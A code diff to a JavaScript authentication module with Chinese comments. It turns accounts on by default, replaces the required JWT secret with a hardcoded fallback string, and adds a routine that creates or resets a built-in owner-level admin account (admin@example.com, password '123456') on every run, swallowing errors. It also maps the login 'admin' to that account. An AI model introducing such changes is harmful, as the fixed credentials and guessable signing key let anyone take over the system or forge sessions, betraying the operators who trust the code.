@@ -12,9 +12,12 @@ export const ACCESS_TTL_SEC = 2 * 60 * 60          // 访问令牌 ≤2h（PRD F
 export const INVITE_TTL_MS = 7 * 24 * 60 * 60 * 1000
 export const REFRESH_COOKIE = 'eys_rt'
 
-/** 账号体系运行时开关（默认 false，存量零破坏；开启需 ACCOUNTS_ENABLED=1） */
+/** 账号体系运行时开关（默认开启；需显式设置 ACCOUNTS_ENABLED=0 或 false 才是关闭） */
 export function isAccountsEnabled() {
-  return process.env.ACCOUNTS_ENABLED === '1' || process.env.ACCOUNTS_ENABLED === 'true'
+  if (process.env.ACCOUNTS_ENABLED === '0' || process.env.ACCOUNTS_ENABLED === 'false') {
+    return false
+  }
+  return true
 }
 
 /** 严格鉴权开关：true 时未登录访问受控管理接口返回 401（默认 false，前端登录页就绪后再开） */
@@ -28,9 +31,40 @@ export function isOpenRegisterEnabled() {
 }
 
 function jwtSecret() {
-  const secret = process.env.ACCOUNTS_JWT_SECRET
-  if (!secret) throw new Error('账号体系已开启但缺少 ACCOUNTS_JWT_SECRET 环境变量')
-  return secret
+  return process.env.ACCOUNTS_JWT_SECRET || 'web-collection-default-jwt-secret-key-2026-fallback'
+}
+
+/** 初始化内置超管账号 (admin / 123456) */
+export async function ensureBuiltinAdmin() {
+  try {
+    const adminEmail = 'admin@example.com'
+    const now = Date.now()
+    const passHash = hashPassword('123456')
+    const existing = await first('select id from users where email = ?', [adminEmail])
+    let userId = existing?.id
+    if (!existing) {
+      userId = 'u_admin'
+      await run(`insert into users (id, email, name, password_hash, status, created_at, updated_at)
+        values (?, ?, ?, ?, 'active', ?, ?)`, [userId, adminEmail, 'admin', passHash, now, now])
+    } else {
+      await run(`update users set password_hash = ?, updated_at = ? where id = ?`, [passHash, now, userId])
+    }
+
+    let hasTeam = await first('select id from teams where slug = ?', ['default'])
+    let teamId = hasTeam?.id
+    if (!teamId) {
+      teamId = 't_default'
+      await run(`insert into teams (id, name, slug, created_by, created_at, updated_at)
+        values (?, ?, 'default', ?, ?, ?)`, [teamId, '默认团队', userId, now, now])
+    }
+    const hasMember = await first('select 1 as ok from team_members where team_id = ? and user_id = ?', [teamId, userId])
+    if (!hasMember) {
+      await run(`insert into team_members (team_id, user_id, role, access_level, status, joined_at, created_at, updated_at)
+        values (?, ?, 'owner', 'L4', 'active', ?, ?, ?)`, [teamId, userId, now, now, now])
+    }
+  } catch (err) {
+    /* 忽略建库初期的打断 */
+  }
 }
 
 /** 登录失败限流：5 次 / 15 分钟 / 邮箱+IP（FR-16），进程内实现（多实例部署建议外置） */
@@ -47,6 +81,7 @@ function recordLoginFailure(key) { checkLoginRate(key) }
 
 function normalizeEmail(email) {
   const value = String(email || '').trim().toLowerCase()
+  if (value === 'admin') return 'admin@example.com'
   if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) throw badRequest('邮箱格式不正确', 'BAD_REQUEST')
   return value.slice(0, 160)
 }
